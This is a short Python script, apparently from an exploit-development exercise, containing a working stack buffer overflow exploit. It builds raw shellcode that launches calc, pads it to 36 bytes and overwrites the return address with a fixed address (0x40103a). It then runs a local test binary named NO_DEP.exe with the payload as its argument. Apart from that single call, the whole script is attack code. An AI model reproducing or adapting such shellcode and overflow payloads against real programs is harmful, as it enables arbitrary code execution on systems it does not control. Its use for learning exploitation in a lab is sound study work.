
import struct
shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1"

fruta = shellcode + "A" * (36-len(shellcode)) + "\x3a\x10\x40"

#0x40103a ret


import subprocess
subprocess.call([r'C:\Users\ricna\Desktop\34\NO_DEP.exe', fruta])

